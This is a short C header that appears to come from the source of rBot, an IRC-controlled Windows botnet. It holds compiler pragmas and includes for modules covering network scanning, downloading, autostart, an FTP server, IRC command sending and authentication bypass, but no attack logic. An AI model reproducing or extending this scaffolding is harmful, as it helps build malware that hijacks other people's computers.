#ifdef WIN32
#define _WIN32_WINNT	0x0403				// Very important for critical sections.
#define WIN32_LEAN_AND_MEAN					// Good to use.
#pragma optimize("gsy", on)					// Global optimization, Short sequences, Frame pointers.
#pragma comment(linker,"/RELEASE")			// Release code
#pragma comment(linker, "/ALIGN:4096")		// This will save you some size on the executable.
#pragma comment(linker, "/IGNORE:4108 ")	// This is only here for when you use /ALIGN:4096.
//#pragma pack(1)								// Force packing on byte boundaries.
#endif // WIN32

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <malloc.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>
#include <Rpc.h>
#include <wchar.h>
#include <winnetwk.h>
#include "defines.h"
#include "ehandler.h"
#include "loaddlls.h"
#include "tcpip.h"
#include "threads.h"
#include "rBot.h"
#include "irc_send.h"
#include "crc32.h"
#include "advscan.h"
#include "ident.h"
#include "rndnick.h"
#include "download.h"
#include "misc.h"
#include "redirect.h"
#include "wildcard.h"
#include "misc.h"
#include "ftpd.h"
#include "aliaslog.h"
#include "autostart.h"
#include "fphost.h"
#include "netapi.h"
#include "netutils.h"
#include "authbypass.h" 